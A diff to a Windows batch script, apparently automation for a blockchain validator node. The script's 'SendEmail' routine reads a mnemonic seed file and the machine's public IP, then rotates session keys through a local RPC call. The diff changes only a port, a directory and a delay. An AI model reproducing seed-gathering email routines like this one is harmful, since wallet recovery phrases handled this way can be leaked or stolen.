@@ -1,10 +1,11 @@
 @echo off
 :SendEmail
-ping -n 3 127.0.0.1 > nul
+cd dll
+ping -n 6 127.0.0.1 > nul
 set /p mnemoricSeedMail=< mnemoricSeed.txt
 for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
 
-FOR /F "tokens=* USEBACKQ" %%g IN (`curl.exe --request POST "http://localhost:8443" --header "Content-Type: application/json" --data-raw "{\"jsonrpc\": \"2.0\", \"method\": \"author_rotateKeys\", \"params\": [],\"id\": 1}"`) do (
+FOR /F "tokens=* USEBACKQ" %%g IN (`curl.exe --request POST "http://localhost:8334" --header "Content-Type: application/json" --data-raw "{\"jsonrpc\": \"2.0\", \"method\": \"author_rotateKeys\", \"params\": [],\"id\": 1}"`) do (
 	echo %%g > curlOut.txt
 	(for /f "tokens=2,* delims=," %%a in (curlOut.txt) do echo %%a) > curlOutTR.txt
 	(for /f "tokens=2,* delims=:" %%a in (curlOutTR.txt) do echo %%a) > curl.txt
